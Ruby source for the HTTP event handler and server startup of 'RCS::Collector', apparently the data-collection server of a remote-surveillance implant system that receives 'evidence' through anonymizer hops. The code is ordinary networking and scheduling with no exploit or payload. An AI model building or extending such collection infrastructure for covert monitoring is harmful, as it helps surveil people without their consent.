#
#  Event handlers
#

# relatives
require_relative 'heartbeat'
require_relative 'http_parser'
require_relative 'sessions'
require_relative 'statistics'
require_relative 'firewall'
require_relative 'nginx'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/systemstatus'

# system
require 'eventmachine'
require 'em-http-server'
require 'socket'

module RCS
module Collector

class HTTPHandler < EM::HttpServer::Server
  include RCS::Tracer
  include Parser
  
  attr_reader :peer
  attr_reader :peer_port
  
  def post_init

    @request_time = Time.now

    # get the peer name
    if get_peername
      @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    else
      @peer = 'unknown'
      @peer_port = 0
    end

    @network_peer = @peer

    # timeout on the socket
    set_comm_inactivity_timeout 300

    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
  end

  def closed?
    @closed
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
    @closed = true
  end

  # override of the em-http-server handler
  def http_error_string(code, desc)
    request = {}
    request[:headers] = @http
    peer = http_get_forwarded_peer(@http)
    @peer = peer unless peer.nil?

    trace :warn, "HACK ALERT: #{@peer} is sending bad requests: #{@http_headers.inspect}"

    page, options = BadRequestPage.create(request)
    return page
  end

  # return the content of the X-Forwarded-For header
  def http_get_forwarded_peer(headers)
    # extract the XFF
    xff = headers[:x_forwarded_for]
    # no header
    return nil if xff.nil?
    # split the peers list
    peers = xff.split(',')
    trace :info, "[#{@peer}] has forwarded the connection for #{peers.inspect}"
    # we just want the first peer that is the original one
    return peers.first
  end

  def process_http_request

    # get the peer of the communication
    # if direct or thru an anonymizer
    peer = http_get_forwarded_peer(@http)
    @peer = peer unless peer.nil?

    #trace :info, "[#{@peer}] Incoming HTTP Connection"
    size = (@http_content) ? @http_content.bytesize : 0
    trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"

    # get it again since if the connection is kept-alive we need a fresh timing for each
    # request and not the total from the beginning of the connection
    @request_time = Time.now

    # update the connection statistics
    StatsManager.instance.add conn: 1

    $watchdog.synchronize do

      responder = nil

      # Block which fulfills the request
      operation = proc do

        trace :debug, "[#{@peer}] QUE: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time})" if Config.instance.global['PERF']

        generation_time = Time.now

        begin
          raise "HACK ALERT: #{@peer} Invalid http protocol (#{@http_protocol})" if @http_protocol != 'HTTP/1.1' and @http_protocol != 'HTTP/1.0'

          # parse all the request params
          request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_content, @http, @peer

          # get the correct controller
          controller = CollectorController.new
          controller.request = request

          # do the dirty job :)
          responder = controller.act!

          # create the response object to be used in the EM::defer callback
          reply = responder.prepare_response(self, request)

          # keep the size of the reply to be used in the closing method
          @response_size = reply.content ? reply.content.bytesize : 0
          trace :debug, "[#{@peer}] GEN: [#{request[:method]}] #{request[:uri]} #{request[:query]} (#{Time.now - generation_time}) #{@response_size.to_s_bytes}" if Config.instance.global['PERF']

          reply
        rescue Exception => e
          trace :error, e.message
          trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")

          request = {}
          request[:headers] = @http
          responder = RESTResponse.new(RESTController::STATUS_BAD_REQUEST, *BadRequestPage.create(request))
          reply = responder.prepare_response(self, {})
          reply
        end

      end

      # Callback block to execute once the request is fulfilled
      response = proc do |reply|
        reply.send_response

         # keep the size of the reply to be used in the closing method
        @response_size = reply.headers['Content-length'] || 0
      end


      # Let the thread pool handle request
      EM.defer(operation, response)

    end

  end

end #HTTPHandler


class HttpServer
  extend RCS::Tracer

  def self.running?
    @server_handle
  end

  def self.start
    @port = RCS::Collector::Config.instance.global['LISTENING_PORT']

    Firewall.create_default_rules

    if RCS::Collector::Config.instance.global['USE_NGINX']
      start_nginx
      # put the ruby server on a different port
      @port += 1
    end

    trace(:info, "Listening on port #{@port}...")
    @server_handle = EM.start_server("0.0.0.0", @port, HTTPHandler)
  rescue Exception => e
    trace(:fatal, "Unable to start http server on port #{@port}: #{e.message} #{e.backtrace}")
    exit!(1)
  end

  def self.stop
    return unless @server_handle

    Nginx.stop if RCS::Collector::Config.instance.global['USE_NGINX']

    trace(:info, "Stopping http server...")
    EM.stop_server(@server_handle) if @server_handle
    @server_handle = nil
  rescue Exception => e
    trace(:fatal, "Unable to stop http server: #{e.message} #{e.backtrace}")
    exit!(1)
  end

  def self.start_nginx
    Nginx.first_hop = Config.instance.global['COLLECTOR_IS_GOOD'] ? "0.0.0.0/0" : DBCache.first_anonymizer
    Nginx.save_config
    begin
      Nginx.start
    rescue Exception => e
      trace :error, "Cannot start Nginx: #{e.message}"
      Nginx.stop!
      sleep 1
      retry
    end

  end

end


class Events
  include RCS::Tracer

  def setup
    # if we have epoll(), prefer it over select()
    EM.epoll

    # set the thread pool size
    EM.threadpool_size = 50


    EM::run do
      # we are alive and ready to party
      SystemStatus.my_status = SystemStatus::OK

      if !Firewall.developer_machine? and Firewall.disabled?
        trace(:error, "Firewall is disabled. You must turn it on. The http server will not start.")
      else
        HttpServer.start
      end

      # send the first heartbeat to the db, we are alive and want to notify the db immediately
      # subsequent heartbeats will be sent every HB_INTERVAL
      HeartBeat.perform

      # set up the heartbeat (the interval is in the config)
      EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }

      # timeout for the sessions (will destroy inactive sessions)
      EM::PeriodicTimer.new(60) { EM.defer(proc{ SessionManager.instance.timeout }) }

      # calculate and save the stats
      EM::PeriodicTimer.new(60) { EM.defer(proc{ StatsManager.instance.calculate }) }

      # auto purge old repositories every hour
      EM::PeriodicTimer.new(3600) { EM.defer(proc{ EvidenceManager.instance.purge_old_repos }) }
    end
  end
end #Events

end #Collector::
end #RCS::
